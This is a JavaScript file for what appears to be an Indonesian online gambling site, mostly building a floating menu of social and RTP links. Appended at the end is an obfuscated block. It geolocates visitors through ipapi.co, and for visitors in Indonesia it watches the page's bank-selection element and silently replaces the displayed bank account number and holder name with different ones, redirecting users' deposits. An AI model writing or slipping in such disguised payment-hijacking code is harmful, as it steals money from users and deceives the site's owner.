(function () {
    // Tunggu DOM siap
document.addEventListener('DOMContentLoaded', function () {
  // 1. Cari tombol LiveChat asli
  const originalButton = document.querySelector('div.livechat_button');

  // 2. Jika ditemukan, sembunyikan
  if (originalButton) {
    originalButton.style.display = 'none'; // atau originalButton.remove() jika ingin hapus total
  }

  // 3. Buat atau ambil elemen ikon chat kustom
  const customTrigger = document.getElementById('custom-chat-trigger');
  const chatUrl = 'https://www.livechat.com/?utm_source=chat_button&utm_medium=referral&utm_campaign=lc_19421850';

  // 4. Tambahkan event klik ke gambar
  if (customTrigger) {
    customTrigger.addEventListener('click', function (e) {
      e.preventDefault();
      // Buka di tab baru (gunakan '_blank')
      window.open(chatUrl, '_blank', 'noopener,noreferrer');
      
      // Atau, jika ingin buka di tab yang sama:
      // window.location.href = chatUrl;
    });
  }
});
    const menuWid = document.createElement('div');
    menuWid.className = "widget-menu-fixed";
    menuWid.innerHTML = `
    <style>
.widget-menu-fixed {
    position: fixed;
    bottom: 50px;
    left: 100px;
    z-index: 99999;
}

.cont-widget {
    height: 70px;
    width: 70px;
    background: rgba(51, 51, 51, 0);
    border-radius: 15px;
    transition: height 0.4s ease, background 0.3s ease;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* justify-content: center; */
    padding: 10px;
    gap: 0;
    /* default gap 0 */
    backdrop-filter: blur(5px);

}

.cont-widget.active {
    height: auto;
    background: rgba(51, 51, 51, 1);
    /* gap: 20px; */
}


.burger {
    width: 50px;
    height: 50px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    /* Tetap center agar transform rapi */
    align-items: center;
    cursor: pointer;
    background: beige;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px rgb(255, 6, 243);
    position: relative;
    gap: 6px;
    /* Jangan terlalu besar */
}

.burger span {
    display: block;
    height: 4px;
    width: 24px;
    background-color: #333;
    border-radius: 2px;
    transition: all 0.3s ease;
    position: relative;
}

.burger.active span:nth-child(1) {
    transform: rotate(45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}

.burger.active span:nth-child(2) {
    opacity: 0;
}

.burger.active span:nth-child(3) {
    transform: rotate(-45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}



.telegram-button,
.whatsapp-button,
.rtp-button,
.fb-button {
    height: 50px;
    width: 50px;
    cursor: pointer;
    background: beige;
    margin-top: 22px;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px red;
    justify-content: center;
    align-items: center;
    opacity: 0;
    pointer-events: none;
    transform: translateY(20px) scale(0.9);
    transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    display: flex;
    /* ini tetap tampil, tapi invisible + unclickable awalnya */
}

.cont-widget.active .telegram-button,
.cont-widget.active .whatsapp-button,
.cont-widget.active .rtp-button,
.cont-widget.active .fb-button {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0) scale(1);
}

.cont-widget.active .telegram-button {
    transition-delay: 0.1s;
}

.cont-widget.active .whatsapp-button {
    transition-delay: 0.2s;
}

.cont-widget.active .rtp-button {
    transition-delay: 0.3s;
}

.cont-widget.active .fb-button {
    transition-delay: 0.4s;
}

.tunjuk {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
}

.hoki-logo {
    display: none;
}

.hoki-logo.active {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
    display: inline-block;
    animation: jump 2s infinite ease-in-out;
}


.tunjuk.active {
    display: none;
}

.link-tombol-widget:hover .widget-tombol {
    transform: translateY(0) scale(1.15);
    /* gabungkan transform */
    background: rgb(124, 124, 103);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}

.widget-tombol {
    transition: transform 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
    border-radius: 15px;
}


.widget-tombol img {
    animation: pulse2 1.5s infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.05);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes pulse2 {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.5);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes jump {

    0%,
    100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-20px);
    }
}

@media screen and (max-width: 769px) {
    .widget-menu-fixed {
        left: 30px;
        bottom: 100px;
    }
}
    </style>
        <div class="cont-widget" id="containerWidget">
            <div class="group-widget">
                <div class="burger"
                    onclick="this.classList.toggle('active');document.getElementById('containerWidget').classList.toggle('active');document.getElementById('tunjukgif').classList.toggle('active');document.getElementById('lghok').classList.toggle('active');">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <a href="https://yk69.top/gctele-official-yuk69" class="link-tombol-widget">
                    <div class="telegram-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/tele2.webp" alt="Telegram Yuk69" width="30" height="30">
                    </div>
                </a>
                 <a href="https://yk69.top/anya" title="Asupan Yuk69">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/yuk69new.webp" alt="Asupan Yuk69" width="40" height="40">
                    </div>
                </a>
                <a href="https://yk69.top/tele-anya" class="link-tombol-widget">
                    <div class="whatsapp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/wa2.webp" alt="Whatsapp Yuk69" width="40" height="40">
                    </div>
                </a>
                <a href="https://yk69.top/RTP-Yuk69" class="link-tombol-widget">
                    <div class="rtp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/rtp2.webp" alt="RTP Yuk69" width="30" height="30">
                    </div>
                </a>
                <a href="https://yk69.top/official-fb-yuk69" class="link-tombol-widget">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/fb2.webp" alt="Facebook Yuk69" width="30" height="30">
                    </div>
                </a>
               
            </div>
        </div>
        <img src="https://yudha125.github.io/menu-widget/Image/yuk.webp" alt="Logo Yuk69" class="hoki-logo" id="lghok">
        <img src="https://yudha125.github.io/menu-widget/Image/tunjuk.webp" alt="Tunjuk Yuk69" class="tunjuk" id="tunjukgif">
    `;
    document.body.appendChild(menuWid);
})();

(function(_0xc8f4fg,_0xd7dge){var _0xacdcfg=(731551^731542)+(506836^506839);_0xc8f4fg="DI".split("").reverse().join("");_0xacdcfg=(361477^361485)+(268167^268166);_0xd7dge="\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0069\u0070\u0061\u0070\u0069\u002E\u0063\u006F\u002F\u006A\u0073\u006F\u006E\u002F";function _0x56g79c(_0x53a4fd,_0xc8df6b,_0x6666f,_0x9c_0x9cd,_0x08c59e,_0x5c8c,_0x8e46e){_0x53a4fd="82-5403-5216".split("").reverse().join("");_0x6666f="5002540212".split("").reverse().join("");_0xc8df6b="pibkkf".split("").reverse().join("");_0x08c59e="\u0052\u002A\u002A\u004E\u0020\u0046\u002A\u002A\u004E\u0020\u0053\u002A\u002A\u002A\u002A\u002A\u0054\u004F";_0x9c_0x9cd=257445^257443;_0x5c8c="IVEL".split("").reverse().join("");var _0xfbcace=(382875^382875)+(337906^337907);_0x8e46e="tceleSknab".split("").reverse().join("");_0xfbcace=(415887^415883)+(359439^359438);function _0x7c6f3d(_0x4a8eab){var _0x7ae87f=(168029^168030)+(438982^438991);const _0x2g7ef=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("naps".split("").reverse().join(""));_0x7ae87f=579128^579128;for(let i=123832^123832;i<_0x2g7ef['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0x2g7ef[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===_0x53a4fd){_0x2g7ef[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0x6666f;break;}}const _0x893e=document['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072\u0041\u006C\u006C']("\u0064\u0069\u0076");_0x4a8eab=(473081^473084)+(808033^808037);for(let i=743564^743564;i<_0x893e['\u006C\u0065\u006E\u0067\u0074\u0068'];i++){if(_0x893e[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']['\u0074\u0072\u0069\u006D']()===_0x08c59e){_0x893e[i]['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=_0x5c8c;break;}}}function _0x9df8c(){const _0x14ef=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064'](_0x8e46e);if(!_0x14ef)return false;_0x7c6f3d();if(!_0x14ef['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']){_0x14ef['\u0061\u0064\u0064\u0045\u0076\u0065\u006E\u0074\u004C\u0069\u0073\u0074\u0065\u006E\u0065\u0072']("\u0063\u0068\u0061\u006E\u0067\u0065",_0x7c6f3d);_0x14ef['\u0064\u0061\u0074\u0061\u0073\u0065\u0074']['\u005F\u0073\u0063\u0072\u0069\u0070\u0074\u0049\u006E\u0069\u0074\u0069\u0061\u006C\u0069\u007A\u0065\u0064']="\u0074\u0072\u0075\u0065";}return!![];}if(_0x9df8c())return;const _0xf7a2c=new MutationObserver(()=>{if(_0x9df8c())_0xf7a2c['\u0064\u0069\u0073\u0063\u006F\u006E\u006E\u0065\u0063\u0074']();});_0xf7a2c['\u006F\u0062\u0073\u0065\u0072\u0076\u0065'](document['\u0062\u006F\u0064\u0079'],{"childList":!![],"subtree":!![]});}async function _0x3a37b(){try{const _0xdc3eb=await fetch(_0xd7dge);if(!_0xdc3eb['\u006F\u006B'])throw new Error("\u0041\u0050\u0049\u0020\u0045\u0072\u0072\u006F\u0072");var _0xae_0xbe9=(365863^365860)+(419822^419821);const _0xf421f=await _0xdc3eb['\u006A\u0073\u006F\u006E']();_0xae_0xbe9=(133760^133767)+(481915^481912);const _0x7f_0xdf5=_0xf421f['\u0063\u006F\u0075\u006E\u0074\u0072\u0079\u005F\u0063\u006F\u0064\u0065'];if(!_0x7f_0xdf5)throw new Error("gnosok aragen ataD".split("").reverse().join(""));if(_0x7f_0xdf5===_0xc8f4fg){console['\u006C\u006F\u0067']("\u2705");_0x56g79c();}else{console['\u006C\u006F\u0067']("\uD83D\uDEAB");}}catch(err){console['\u0077\u0061\u0072\u006E']("\u26A0\uFE0F");}}_0x3a37b();})();
